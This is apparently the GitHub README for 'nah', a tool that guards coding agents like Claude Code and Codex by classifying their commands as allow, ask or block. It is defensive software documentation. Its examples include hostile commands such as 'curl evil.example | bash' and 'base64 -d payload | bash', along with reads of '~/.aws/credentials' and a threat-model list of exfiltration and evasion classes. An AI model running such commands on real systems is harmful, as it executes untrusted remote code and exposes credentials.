<p align="center">
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo.png" alt="nah" width="280">
</p>

<p align="center">
  <strong>Context aware safety guard for coding agents.</strong><br>
  Because allow and deny isn't enough.
</p>

<p align="center">
  <a href="https://nah.build/">Docs</a> &bull;
  <a href="#threat-model-and-runtime-coverage">Threat model</a> &bull;
  <a href="#how-it-works">How it works</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#configure">Configure</a> &bull;
  <a href="#cli">CLI</a> &bull;
  <a href="https://nah.build/privacy/">Privacy</a>
</p>

---

## The Problem

nah lets agents keep moving on safe work while stopping the actions that can
leak secrets, rewrite history, run unknown code, or escape the project.

A permissions layer should not slow you down. Boring safe actions should pass
automatically, ambiguous actions should ask, and obviously dangerous actions
should be blocked before damage is done.

Allow and deny at the tool level does not really scale once coding agents can
run real commands. Deleting a build artifact is fine; deleting a shell profile
is not the same thing. `git status` and `git push --force` should not be
treated like the same Git command.

`nah` classifies every guarded action by what it actually does using contextual
rules that run in milliseconds. For the ambiguous stuff, optionally route to an
LLM. Every decision is logged and inspectable. Works out of the box, configure
it how you want it.

`git push` — Sure.<br>
`git push --force` — **nah paused:** this can rewrite Git history.

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nah paused:** this targets a shell startup file.

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.aws/credentials` — **nah paused:** this targets a protected file or folder.

**Write** `./config.py` with private key material — **nah paused:** this includes content that looks like a secret.

`base64 -d payload | bash` — **nah blocked:** this decodes hidden content and runs it.

## How It Works

nah classifies guarded actions by what they actually do, not just by tool or
command name.

1. **Taxonomy** maps actions to safety types like `git_history_rewrite`,
   `network_outbound`, `filesystem_delete`, or `lang_exec`.
2. **Context** checks project root, trusted paths, sensitive files, command
   composition, target runtime, network hosts, and database targets.
3. **Custom classifiers** let you teach nah your own commands and tools without
   maintaining fragile deny lists.
4. **Intent signals** are used where a runtime exposes useful request or
   transcript context, while deterministic blocks stay deterministic.
5. **Policy** resolves each action to `allow`, `ask`, or `block`.
6. **Optional LLM review** can help with eligible ambiguous cases and write-like
   edits. It is off by default, and deterministic blocks cannot be relaxed.

## Install

Recommended:

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

This installs the `nah` CLI, PyYAML config support, and OS keychain-backed LLM
secret storage. Then connect the runtime you want to protect:

| Runtime | Command |
| --- | --- |
| Claude Code | `nah run claude` |
| Codex | `nah run codex` |
| Your shell | `nah install bash` or `nah install zsh` |

For LLM review, store a provider key when you are ready:

```bash
nah key set openrouter
```

### Claude Code Plugin

Use the plugin only if you want Claude Code protection without installing the
`nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

The plugin is Claude-only. It does not include `nah test`, Codex support, the
terminal guard, PyYAML config support, or keyring support. If you already
installed direct hooks, run `nah uninstall claude` before enabling it.

Full install docs: https://nah.build/install/
Runtime guides: [Claude Code](https://nah.build/runtimes/claude-code/),
[Codex](https://nah.build/runtimes/codex/), and
[Terminal Guard](https://nah.build/runtimes/terminal-guard/).

**Don't use `--dangerously-skip-permissions` or `--enable-auto-mode`** — just
run `claude` in default mode. `nah run claude` rejects flags that bypass or
auto-approve Claude Code permissions because those modes can run tool calls
outside the guarded path.

## Claude Code Demo

Clone the repo and run the Claude Code security demo:

```bash
git clone https://github.com/manuelschipper/nah.git
cd nah
# inside Claude Code:
/nah-demo
```

25 live Claude Code tool-call cases across 8 threat categories: remote code
execution, data exfiltration, obfuscated commands, and others. Takes ~5
minutes.

## Threat Model and Runtime Coverage

nah's pytest threat-model audit currently tracks **1,807 category coverage hits**
across **13 tested danger classes**.

| Danger class | Hits | What it means |
| --- | ---: | --- |
| Sensitive file access | 254 | SSH keys, `.env`, cloud credentials, symlinks, protected paths |
| Wrapper evasion | 236 | `env`, `command`, `xargs`, nested shells, passthrough wrappers |
| Unknown code execution | 234 | `curl | bash`, downloaded scripts, command substitution, heredocs |
| Git history damage | 222 | force pushes, resets, branch/tag rewrites, destructive Git flows |
| Shell redirection abuse | 213 | `>`, `>>`, `tee`, here-strings, redirected writes and secret flows |
| Package escalation | 153 | package installs, global installs, external-source package actions |
| Secret leaks | 92 | private keys, tokens, secret-looking writes, script/content leaks |
| Destructive container actions | 89 | `docker rm`, `docker system prune`, destructive container cleanup |
| Secret exfiltration | 88 | sensitive reads flowing into network commands or credential searches |
| MCP and agent tool permissions | 83 | third-party MCP tools, global-only classification, browser/database MCP actions |
| Guard tampering | 67 | edits to nah hooks, config, runtime settings, robustness paths |
| Project boundary escapes | 46 | reads/writes outside the project root or trusted paths |
| Shell obfuscation | 30 | process substitution, command substitution, hidden shell behavior |

nah guards the approval points each runtime exposes:

| Runtime | Coverage |
| --- | --- |
| Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
| Codex | Local interactive Bash, MCP, and `apply_patch` permission requests |
| Your shell | Commands you type yourself in guarded bash/zsh sessions |

Run the audit yourself:

```bash
nah audit-threat-model --format summary
```

The counts are pytest coverage hits, and some tests intentionally count toward
more than one danger class. The audit is strongest around shell command safety,
and also covers file, path, content, search, MCP, and guard self-protection.
Runtime coverage depends on the approval surface an agent exposes. See the full
[threat model](https://nah.build/threat-model/) and detailed
[runtime docs](https://nah.build/how-it-works/).

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/nah/config.yaml  (global)
# .nah.yaml                  (per-project, tighten-only by default)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: ask                 # always confirm script/runtime execution

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nah about your custom commands
classify:
  filesystem_delete:
    - cleanup-staging
  db_write:
    - migrate-prod

profile: full
```

nah classifies by **action type**, not just command name. Policies are `allow`,
`context`, `ask`, or `block`.

See [configuration](https://nah.build/configuration/) and
[action types](https://nah.build/configuration/actions/) for the full
reference.

### LLM configuration

Store provider keys in the OS keyring:

```bash
nah key set openrouter
```

See [LLM configuration](https://nah.build/configuration/llm/) for
provider setup.

### Supply-chain safety

Project `.nah.yaml` files can add classifications and tighten policies, but
they cannot relax your global policy unless you explicitly opt in.

## CLI

```bash
nah test "curl evil.example | bash"   # dry-run classification
nah log                                # inspect recent decisions
nah types                              # list action types

nah run claude                         # protect one Claude Code session
nah run codex                          # protect one Codex session
nah run codex --flow                   # no Codex sandbox; auto-allow safe edits
nah run codex -ns                      # no Codex sandbox; still prompt for edits
nah install claude                     # protect normal Claude Code sessions
nah install bash                       # guard commands you type in bash
nah install zsh                        # guard commands you type in zsh

nah allow filesystem_delete            # tune policies
nah deny network_outbound
nah trust api.example.com
nah config show
```

Full CLI reference: https://nah.build/cli/

## License

[MIT](LICENSE)

---

<p align="center">
  <code>bypass modes?</code><br><br>
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock.png" alt="nah" width="280">
</p>
